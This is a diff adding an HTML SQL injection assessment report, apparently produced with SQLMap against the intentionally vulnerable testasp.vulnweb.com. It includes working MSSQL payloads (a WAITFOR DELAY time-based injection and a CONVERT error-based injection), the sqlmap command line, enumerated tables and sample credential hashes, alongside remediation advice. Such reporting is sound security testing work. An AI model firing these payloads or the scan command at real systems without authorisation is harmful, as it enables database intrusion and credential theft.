@@ -1,0 +1,284 @@
+
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>SQL Injection Security Assessment - testasp.vulnweb.com (api) - 2025-09-28</title>
+        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+        <style>
+          :root { --bg:#f4f7f9; --fg:#333; --muted:#7f8c8d; --panel:#ffffff; --primary:#2c3e50; --accent:#3498db; --ok:#2ecc71; --warn:#f1c40f; --high:#e67e22; --crit:#e74c3c; --info:#3498db; }
+          * { box-sizing: border-box; }
+          body { font-family: 'Roboto', sans-serif; margin: 0; padding: 0; background-color: var(--bg); color: var(--fg); }
+          .report-container { max-width: 1100px; margin: 20px auto; background: var(--panel); border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); overflow: hidden; }
+          .report-header { background: #2c3e50; color: #fff; padding: 40px; text-align: center; }
+          .report-header h1 { margin: 0; font-size: 2.8em; }
+          .report-header p { margin: 5px 0 0; font-size: 1.2em; color: #bdc3c7; }
+          .main-content { padding: 24px; }
+          .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 24px; }
+          .summary-item { background: #ecf0f1; padding: 18px; border-radius: 10px; text-align: center; display:flex; flex-direction:column; justify-content:center; align-items:center; gap:8px; min-height:120px; }
+          .summary-item h3 { margin: 0; color: #2980b9; font-size: 1.05em; word-break: break-word; overflow-wrap:anywhere; max-width:100%; }
+          .summary-item p, .summary-item .score { font-weight: 700; font-size: 1.6em; color: #2c3e50; margin:0; word-break: break-word; overflow-wrap:anywhere; line-height:1.2; max-width:100%; }
+          .risk-score .score, .risk-score .level { color: #e67e22; }
+          .section { margin-bottom: 30px; }
+          .section h2 { font-size: 2em; color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; margin-bottom: 20px; }
+          .vulnerability-card { border: 1px solid #ddd; border-radius: 8px; margin-bottom: 20px; overflow: hidden; }
+          .vulnerability-header { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-left: 5px solid; }
+          .vulnerability-header h4 { margin: 0; font-size: 1.4em; }
+          .vulnerability-body { padding: 15px; }
+          .severity { color: #fff; padding: 5px 12px; border-radius: 15px; font-weight: 700; font-size: 0.9em; }
+          ul { padding-left: 20px; }
+          li { margin-bottom: 8px; }
+          code { background: #e8e8e8; padding: 3px 6px; border-radius: 3px; font-family: 'Courier New', monospace; font-size: 0.95em; word-break: break-word; overflow-wrap:anywhere; max-width:100%; display:inline-block; }
+          .report-footer { text-align: center; padding: 20px; font-size: 0.9em; color: #7f8c8d; background: #ecf0f1; }
+          
+
+          .severity-criteria { background:#f8fafc; border-radius:12px; padding:18px; border:1px solid #e1e8f0; }
+          .severity-intro { color:#4b5563; margin-bottom:16px; }
+          .severity-grid { display:grid; grid-template-columns: repeat(auto-fit, minmax(240px,1fr)); gap:16px; }
+          .severity-card { border-radius:10px; padding:16px; background:#fff; border:1px solid #dbe4f0; box-shadow:0 1px 2px rgba(15,23,42,0.05); }
+          .severity-card h3 { margin-top:0; margin-bottom:8px; }
+          .severity-card p { margin:0 0 8px; color:#334155; }
+          .severity-summary { font-weight:600; }
+          .severity-detail { font-size:0.95em; }
+          .severity-impacts { margin:0 0 8px; padding-left:20px; color:#1f2937; }
+          .severity-techniques { font-size:0.9em; color:#475569; }
+
+          .severity-critical { border-left:5px solid #e74c3c; }
+          .severity-high { border-left:5px solid #e67e22; }
+          .severity-medium { border-left:5px solid #f1c40f; }
+          .severity-low { border-left:5px solid #2ecc71; }
+          .severity-informational { border-left:5px solid #3498db; }
+
+          /* New UI additions */
+          .verdict { display:flex; flex-wrap:wrap; gap:10px; align-items:center; background:#ecf0f1; padding:16px; border-radius:10px; }
+          .badge { display:inline-block; background:#dde6ee; color:#2c3e50; padding:2px 8px; border-radius:999px; font-size:12px; margin-left:6px; }
+          .status { text-transform: capitalize; padding:2px 8px; border-radius:999px; font-size:12px; }
+          .status.confirmed { background:#eaf7ff; color:#0b6bab; }
+          .status.suspected { background:#fff7e6; color:#a66a00; }
+          .status.tested { background:#f0f0f0; color:#555; }
+          .status.exploited { background:#ffecec; color:#a30000; }
+          .tech-table { width:100%; border-collapse: collapse; }
+          .tech-table th, .tech-table td { border-bottom:1px solid #eee; padding:10px; text-align:left; }
+          .tech-table th { background:#f8fafc; font-weight:600; }
+          .table-wrap { overflow:auto; border:1px solid #eee; border-radius:8px; }
+          .details summary { cursor:pointer; color:#2c3e50; font-weight:600; margin:8px 0; }
+          .confidence-note { background:#f1f5f9; border:1px solid #d5e3f6; border-radius:10px; padding:12px 16px; }
+          .confidence-note summary { background:#e7f1ff; border-radius:8px; margin:-12px -16px 12px; padding:12px 16px; }
+          .confidence-note[open] summary { border-bottom:1px solid #d5e3f6; border-bottom-left-radius:0; border-bottom-right-radius:0; }
+          .confidence-note p { margin:0 0 12px; color:#334155; }
+          .confidence-note ul { margin:0 0 12px; padding-left:20px; }
+          .payload { background:#f7f7f7; padding:12px; border-radius:8px; overflow:auto; }
+          .evidence-row { display:flex; gap:10px; align-items:flex-start; padding:6px 0; border-bottom:1px dashed #eee; }
+          .evidence-row .line { color:#7f8c8d; min-width:40px; font-family:monospace; }
+
+          /* Responsive tweaks */
+          @media (max-width: 768px) {
+            .summary-item { min-height:auto; padding:16px; }
+            .summary-item p, .summary-item .score { font-size: 1.35em; }
+          }
+
+          @media (max-width: 640px) {
+            .report-header h1 { font-size: 2em; }
+            .section h2 { font-size: 1.5em; }
+            .summary-grid { grid-template-columns: minmax(0, 1fr); }
+            .summary-item { align-items:flex-start; text-align:left; }
+            .summary-item p, .summary-item .score { font-size: 1.25em; }
+          }
+        </style>
+      </head>
+      <body>
+        <div class="report-container">
+          <div class="report-header">
+            <h1>Security Assessment Report</h1>
+            <p>SQL Injection Security Assessment - testasp.vulnweb.com (api) - 2025-09-28</p>
+          </div>
+          
+          
+          
+          <div class="main-content">
+            <div class="summary-grid">
+              <div class="summary-item">
+                <h3>Target</h3>
+                <p>https://testasp.vulnweb.com/</p>
+              </div>
+              <div class="summary-item">
+                <h3>Scan Date</h3>
+                <p>9/28/2025</p>
+              </div>
+              <div class="summary-item risk-score">
+                <h3>Overall Risk</h3>
+                <p class="score level">High</p>
+              </div>
+              <div class="summary-item">
+                <h3>Vulnerabilities</h3>
+                <p>2</p>
+              </div>
+              <div class="summary-item">
+                <h3>Scan Duration</h3>
+                <p>6m 58s</p>
+              </div>
+            </div>
+
+            
+            <div class="section severity-criteria">
+              <h2>How we grade severity</h2>
+              <p class="severity-intro">Severity ratings reflect what SQLMap actually proved during the scan. Critical findings mean stacked (multi-statement) execution was confirmed, which enables data tampering and destructive changes. High findings confirm controllable single statements that expose data or logic through boolean/time-based, error-based, union-based, or classical payloads.</p>
+              <div class="severity-grid">
+                
+            <div class="severity-card severity-critical">
+              <h3>Critical</h3>
+              <p class="severity-summary">Stacked (multi-statement) SQL injection confirmed.</p>
+              <p class="severity-detail">SQLMap proved the ability to append multiple SQL statements in a single request (e.g., statement terminators followed by INSERT/UPDATE/DELETE or DDL). Attackers can tamper with data, modify schema, or potentially reach file/command execution depending on DBMS privileges.</p>
+              <ul class="severity-impacts"><li>Data tampering and destructive writes</li><li>Schema changes such as DROP/ALTER</li><li>Opportunity for file read/write or OS command execution</li></ul>
+              <div class="severity-techniques"><strong>Techniques:</strong> Stacked queries</div>
+            </div>
+          
+            <div class="severity-card severity-high">
+              <h3>High</h3>
+              <p class="severity-summary">Single-statement SQL injection confirmed with data access.</p>
+              <p class="severity-detail">SQLMap demonstrated control of a query that leaks data or metadata through boolean/time-based, error-based, union-based, or classic payloads. Attackers can read sensitive information and pivot into additional manual exploitation.</p>
+              <ul class="severity-impacts"><li>Data disclosure and credential theft</li><li>Authentication bypass or privilege abuse</li><li>Database enumeration for follow-on attacks</li></ul>
+              <div class="severity-techniques"><strong>Techniques:</strong> SQL Injection, Boolean-based blind SQL injection, Time-based blind SQL injection, Error-based SQL injection, Union query SQL injection</div>
+            </div>
+          
+              </div>
+            </div>
+          
+
+            <div class="section">
+              <h2>Overall verdict</h2>
+              <div class="verdict">
+                <strong>Verdict:</strong> <span class="status exploited">Exploited</span>
+                <span class="badge">evidence-driven</span>
+                <div style="flex-basis:100%;height:0"></div>
+                <div>At least one injection technique was confirmed and actual data/metadata was extracted from the target.</div>
+              </div>
+            </div>
+
+            <div class="section">
+              <h2>Techniques summary</h2>
+              <div class="table-wrap">
+                <table class="tech-table" role="table" aria-label="Techniques summary">
+                  <thead>
+                    <tr><th>Technique</th><th>Parameter</th><th>Status</th><th>Confidence</th></tr>
+                  </thead>
+                  <tbody>
+                    
+        <tr>
+          <td>Time-based blind SQL injection</td>
+          <td><code>txtSearch</code> <span class="badge">POST</span></td>
+          <td><span class="status confirmed">confirmed</span></td>
+          <td>Confirmed (94%)</td>
+        </tr>
+      
+        <tr>
+          <td>Error-based SQL injection</td>
+          <td><code>txtMessage</code> <span class="badge">POST</span></td>
+          <td><span class="status confirmed">confirmed</span></td>
+          <td>Confirmed (91%)</td>
+        </tr>
+      
+                  </tbody>
+                </table>
+              </div>
+            </div>
+
+            <div class="section">
+              <h2>Confidence scoring</h2>
+              <details class="details confidence-note">
+                <summary>Why confirmed findings can show 90%–99% confidence</summary>
+                <p>Each technique SQLMap tries (error-based, boolean, time delay, union, stacked, etc.) gets its own confidence score. Even when a payload works, the tool keeps a little margin because different checks can return noisy signals.</p>
+                <ul>
+                  <li><strong>Multiple techniques:</strong> Scores reflect the reliability of the specific method, not a single global verdict.</li>
+                  <li><strong>Protection against false positives:</strong> The remaining few percent covers edge cases like flaky responses or defensive systems altering replies.</li>
+                  <li><strong>Anything above ~90% is treated as confirmed:</strong> In practice, these findings have already been demonstrated with working evidence.</li>
+                </ul>
+                <p>If a score ever drops much lower, investigate manually before acting on the result.</p>
+              </details>
+            </div>
+
+            <div class="section">
+              <h2>Detailed Findings</h2>
+              
+      <div class="vulnerability-card">
+        <div class="vulnerability-header" style="border-left-color: #e67e22;">
+          <h4>Time-based blind SQL injection</h4>
+          <span class="severity" style="background-color: #e67e22;">High</span>
+        </div>
+        <div class="vulnerability-body">
+          <p><strong>Parameter:</strong> <code>txtSearch</code> (POST)</p>
+          <p><strong>Status:</strong> <span class="status confirmed">confirmed</span> · <strong>Confidence:</strong> Confirmed (94%)</p>
+          <p><strong>Description:</strong> Microsoft SQL Server time-based blind - WAITFOR DELAY()</p>
+          <p><strong>Impact:</strong> Response delay allows extraction of catalogue data via timing side-channels.</p>
+          <p><strong>Why this is shown:</strong> WAITFOR DELAY payload introduced 5s response windows whenever the queried character matched.</p>
+          <details class="details"><summary>Show payload (sanitized)</summary><pre class="payload"><code>txtSearch=laptop&#39;;WAITFOR DELAY &#39;0:0:5&#39;-- -&amp;btnSubmit=Search</code></pre></details>
+          <details class="details"><summary>Show evidence</summary><div class="evidence-row"><span class="line">L0</span><code>Parameter: txtSearch (POST)</code></div><div class="evidence-row"><span class="line">L1</span><code>Type: time-based blind</code></div><div class="evidence-row"><span class="line">L2</span><code>Title: Microsoft SQL Server time-based blind - WAITFOR DELAY()</code></div><div class="evidence-row"><span class="line">L3</span><code>Payload: txtSearch=laptop&#39;;WAITFOR DELAY &#39;0:0:5&#39;-- -&amp;btnSubmit=Search</code></div><div class="evidence-row"><span class="line">L4</span><code>POST parameter &quot;txtSearch&quot; triggered deterministic WAITFOR DELAY timings.</code></div><div class="evidence-row"><span class="line">L5</span><code>Enumerated database: ACU_TestASP</code></div><div class="evidence-row"><span class="line">L6</span><code>Enumerated database: aspnetdb</code></div><div class="evidence-row"><span class="line">L7</span><code>Enumerated table: ACU_TestASP.dbo.Users (UserId, UserName, PasswordHash)</code></div><div class="evidence-row"><span class="line">L8</span><code>Enumerated table: ACU_TestASP.dbo.CreditCards (CardNumber, CardType, Expiration)</code></div><div class="evidence-row"><span class="line">L9</span><code>Extracted credential sample: admin:d033e22ae348aeb5660fc2140aec35850c4da997</code></div><div class="evidence-row"><span class="line">L10</span><code>Extracted credential sample: support@vulnweb.com:5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8</code></div><div class="evidence-row"><span class="line">L11</span><code>DBMS fingerprint: Microsoft SQL Server 2012, IIS 8.5 / ASP.NET 4.0, Current User: dbo</code></div></details>
+          <h5>Remediation</h5>
+          <ul>
+            <li>Use parameterized queries exclusively</li><li>Implement query timeout controls</li><li>Monitor and alert on unusual query patterns</li>
+          </ul>
+        </div>
+      </div>
+      <div class="vulnerability-card">
+        <div class="vulnerability-header" style="border-left-color: #e67e22;">
+          <h4>Error-based SQL injection</h4>
+          <span class="severity" style="background-color: #e67e22;">High</span>
+        </div>
+        <div class="vulnerability-body">
+          <p><strong>Parameter:</strong> <code>txtMessage</code> (POST)</p>
+          <p><strong>Status:</strong> <span class="status confirmed">confirmed</span> · <strong>Confidence:</strong> Confirmed (91%)</p>
+          <p><strong>Description:</strong> SQL Server error-based - convert() stack trace disclosure</p>
+          <p><strong>Impact:</strong> Error detail reveals table structure and stored procedure context of the feedback module.</p>
+          <p><strong>Why this is shown:</strong> CONVERT-based payload returned detailed ASP.NET stack trace with underlying SQL.</p>
+          <details class="details"><summary>Show payload (sanitized)</summary><pre class="payload"><code>txtName=Audit&amp;txtEmail=audit%40example.com&amp;txtMessage=test&#39;+CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -&amp;btnSubmit=Send</code></pre></details>
+          <details class="details"><summary>Show evidence</summary><div class="evidence-row"><span class="line">L0</span><code>Parameter: txtMessage (POST)</code></div><div class="evidence-row"><span class="line">L1</span><code>Type: error-based</code></div><div class="evidence-row"><span class="line">L2</span><code>Title: SQL Server error-based - convert() stack trace disclosure</code></div><div class="evidence-row"><span class="line">L3</span><code>Payload: txtName=Audit&amp;txtEmail=audit%40example.com&amp;txtMessage=test&#39;+CONVERT(int,(SELECT TOP 1 name FROM sys.tables))-- -&amp;btnSubmit=Send</code></div><div class="evidence-row"><span class="line">L4</span><code>Feedback handler exposed SQL error showing table metadata.</code></div></details>
+          <h5>Remediation</h5>
+          <ul>
+            <li>Use parameterized queries and stored procedures where appropriate</li><li>Disable verbose error messages and avoid echoing DB errors to clients</li><li>Implement centralized error handling and generic error responses</li><li>Apply least privilege to DB users to limit metadata exposure</li>
+          </ul>
+        </div>
+      </div>
+            </div>
+
+            <div class="section">
+              <h2>General Recommendations</h2>
+              <ul>
+                <li><strong>Implement Parameterized Queries:</strong> Replace all dynamic SQL queries with parameterized queries or prepared statements to eliminate concatenated input vectors.</li><li><strong>Regular Security Assessments:</strong> Schedule recurring SQL injection testing and integrate the scan coverage into CI/CD workflows.</li>
+              </ul>
+            </div>
+
+            <div class="section">
+              <h2>Extracted Data</h2>
+              
+                    <h3>Databases</h3>
+                    <ul><li>ACU_TestASP</li><li>aspnetdb</li></ul>
+                  
+                    <h3>Tables</h3>
+                    <ul><li>ACU_TestASP.dbo.Users (UserId, UserName, PasswordHash)</li><li>ACU_TestASP.dbo.CreditCards (CardNumber, CardType, Expiration)</li></ul>
+                  
+                    <h3>Users</h3>
+                    <ul><li>admin:d033e22ae348aeb5660fc2140aec35850c4da997</li><li>support@vulnweb.com:5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8</li></ul>
+                  
+                    <h3>System Info</h3>
+                    <ul>
+                      <li>DBMS: Microsoft SQL Server 2012, IIS 8.5 / ASP.NET 4.0, Current User: dbo</li>
+                      
+                    </ul>
+                  
+            </div>
+
+            
+
+            <div class="section">
+              <h2>Scan Command</h2>
+              <code>sqlmap -u https://testasp.vulnweb.com/search.aspx --data "txtSearch=laptop&btnSubmit=Search" --risk=2 --level=4 --batch</code>
+            </div>
+          </div>
+          <div class="report-footer">
+            <p>Generated on Mon, 06 Oct 2025 08:55:51 GMT</p>
+          </div>
+        </div>
+      </body>
+      </html>
+    
